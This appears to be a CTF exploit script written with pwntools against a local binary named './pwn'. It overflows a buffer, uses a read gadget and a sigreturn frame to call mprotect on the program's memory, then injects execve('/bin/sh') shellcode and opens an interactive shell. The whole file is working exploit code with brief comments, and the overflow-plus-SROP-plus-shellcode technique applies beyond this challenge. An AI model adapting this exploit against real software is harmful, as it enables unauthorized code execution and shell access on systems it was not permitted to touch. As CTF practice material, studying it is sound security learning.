
from pwn import *
context.bits = 64
context.clear(arch='amd64')


p = process("./pwn")

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# Taken from ropgadget

syscall = 0x40101b

# Read gadget is found inside the start itself when if echos our string.

read = 0x401016

# read + syscall = actuall read

########

# Minimum area possible is the place where we write
# To set that place as writable

writable = 0x400000

# Clearly from ghidra the entry point is at 00400018 . This is to safely return back to entry point
# Avoids crash

entrypoint = 0x400018

# Making frame so that we can send entire thing as a str in payload then execute sigreturn to execute this

frame = SigreturnFrame()
frame.rax = 0xa
frame.rdi = writable
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = entrypoint
frame.rip = syscall

#read all the reg into stdin (300 here) after buffer overflow of 8

print(frame,type(frame))

payload = b"A"*8 + p64(read) + p64(syscall) + bytes(frame)

#print(payload)
p.send(payload)

print("Reached here after sending 1st payload")
# perform sigreturn

payload = b"A"*15

print("Reached here after sigreturn 15")

#print(payload)
p.send(payload)

# Successfully completed our setting up of stack frame with executable, read ,write access

print("Reached before payload")

payload = b"A"*8 + p64(entrypoint+8) + shellcode

print(shellcode , payload)
p.send(payload)

p.interactive()
